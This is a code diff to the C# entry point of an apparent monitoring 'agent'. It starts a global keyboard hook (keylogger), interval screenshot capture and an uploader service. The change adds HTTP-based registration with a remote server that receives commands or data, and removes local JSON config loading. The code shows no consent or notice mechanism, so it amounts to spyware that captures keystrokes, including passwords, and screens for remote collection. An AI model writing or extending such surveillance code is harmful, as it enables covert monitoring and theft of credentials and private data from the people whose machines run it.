@@ -4,24 +4,25 @@ using Common.Interfaces;
 using Common.Models;
 using KeyLogger.Interfaces;
 using ks.EngineServices;
-using Newtonsoft.Json;
 using Screenshot.Interfaces;
 using Screenshot.Services;
 using System;
-using System.Collections.Generic;
-using System.IO;
-using System.Linq;
+using System.Net.Http;
+using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace ks
 {
     public class Program
     {
         [STAThread]
-        static void Main(string[] args)
+        static async Task Main(string[] args)
         {
             ILogger logger = new Logger();
+
             try
             {
+                // ------------------ DB Tables ------------------
                 DBContexts.CreateTableIfNotExists<Configurations>();
                 DBContexts.CreateTableIfNotExists<KeyEvents>();
                 DBContexts.CreateTableIfNotExists<KeySessions>();
@@ -34,60 +35,34 @@ namespace ks
                 DBContexts.CreateTableIfNotExists<LoggerEntry>();
                 logger.LogInformation("All database tables verified or created.");
 
-                string configPath = @"C:\Users\xushn\OneDrive\Desktop\ks\ks\agent.json";
+                var httpClient = new HttpClient();
 
-                Dictionary<string, string> configDict;
+                // ------------------ Agent Registration ------------------
+                var regAndReceiver = new RegistrationAndReceiver(httpClient, logger);
+                var receiverTask = Task.Run(() => regAndReceiver.StartAsync(default));
 
-                if (File.Exists(configPath))
-                {
-                    string jsonContent = File.ReadAllText(configPath);
-                    var configList = JsonConvert.DeserializeObject<List<Configurations>>(jsonContent);
-
-                    if (configList != null && configList.Count > 0)
-                    {
-                        configDict = configList.ToDictionary(c => c.Name, c => c.Value);
-
-                        foreach (var kv in configDict)
-                        {
-                            var config = new Configurations
-                            {
-                                Name = kv.Key,
-                                Value = kv.Value
-                            };
-                            DBContexts.InsertOrUpdateConfig(config);
-                        }
-                        logger.LogInformation("Configurations loaded from agent.json and inserted into DB.");
-                    }
-                    else
-                    {
-                        configDict = new Dictionary<string, string>();
-                        logger.LogInformation("agent.json is empty. Using default configuration.");
-                    }
-                }
-                else
-                {
-                    configDict = new Dictionary<string, string>();
-                    logger.LogInformation("agent.json not found. Using default configuration.");
-                }
-
-                ConfigurationApplier.Apply(configDict, logger);
-                logger.LogInformation("Configuration successfully applied.");
-
+                // ------------------ Screenshot Service ------------------
                 ITakeScreenshot screenshot = new TakeScreenshot(logger);
                 ICaptureWithInterval captureScr = new CaptureWithInterval(screenshot, logger);
                 captureScr.Capture();
-                logger.LogInformation("Screenshot capture service started.");
+                logger.LogInformation("Screenshot service started.");
 
+                // ------------------ Keylogger ------------------
                 IKeyLoggerEngine engine = new KeyLoggerEngine(logger);
                 IKeyLoggerHook hook = new KeyloggerHook(engine, logger);
                 hook.Start();
                 logger.LogInformation("Keylogger hook started.");
 
+                // ------------------ Uploader Service ------------------
                 UploaderService uploader = new UploaderService(logger);
                 logger.LogInformation("Uploader service initialized.");
 
-                logger.LogInformation("Agent is running. Press Ctrl+C to exit.");
-                System.Windows.Forms.Application.Run();
+                logger.LogInformation("Agent is running....");
+                Application.Run(); // Windows message loop
+
+                // Background service task stop
+                await regAndReceiver.StopAsync(default);
+                await receiverTask;
             }
             catch (Exception ex)
             {
